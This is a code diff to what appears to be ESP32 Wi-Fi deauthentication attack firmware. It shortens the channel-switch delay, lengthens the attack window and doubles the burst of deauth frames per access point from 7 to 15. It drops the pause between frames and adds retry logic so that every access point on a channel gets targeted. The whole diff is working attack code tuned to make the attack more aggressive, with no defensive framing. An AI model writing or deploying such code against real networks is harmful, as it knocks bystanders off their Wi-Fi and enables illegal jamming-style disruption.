@@ -12,9 +12,9 @@
 
 #define DEAUTHER_TASK_PRIO 5
 // Syncronization times
-#define CHANNEL_SWITCH_DELAY 12   // Channel switch assestment time
-#define ATTACK_WINDOW        80  // RCO duration
-#define SOFTAP_REST_TIME     180   // Home channel time
+#define CHANNEL_SWITCH_DELAY 5   // Channel switch assestment time
+#define ATTACK_WINDOW        85  // RCO duration
+#define SOFTAP_REST_TIME     200   // Home channel time
 #define SINGLE_TARGET_ROOM   80
 
 static const char *TAG = "DEAUTHER";
@@ -239,7 +239,8 @@ static void deauther_send_frames(const target_info_t *target)
         for (uint8_t j = 0; j < num_channels; j++) 
         {
             uint8_t current_ch = target_channels[j];
-            wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
+            esp_err_t ret = wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
+            if(ret != ESP_OK ) ESP_LOGI(TAG, "%s", esp_err_to_name(ret));
             vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
             int64_t start_time = esp_timer_get_time();
             for (int i = 0; i < aps.count; i++) 
@@ -247,12 +248,17 @@ static void deauther_send_frames(const target_info_t *target)
                 if (aps.ap[i].primary == current_ch) 
                 {
                     // Burst di pacchetti
-                    for(int k=0; k<7; k++) {
+                    for(int k=0; k<15; k++) {
                         execute_attack_on_target(aps.ap[i].bssid, (const char*)aps.ap[i].ssid, current_ch);
-                        vTaskDelay(pdMS_TO_TICKS(10)); 
                     }
                 }
-                if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
+                if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) {
+                    /* Need more time on this channel to send to all aps */
+                    vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
+                    wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
+                    vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
+                    start_time = esp_timer_get_time();
+                };
             }
             int64_t elapsed = (esp_timer_get_time() - start_time) / 1000;
             if (elapsed < (ATTACK_WINDOW - CHANNEL_SWITCH_DELAY)) {
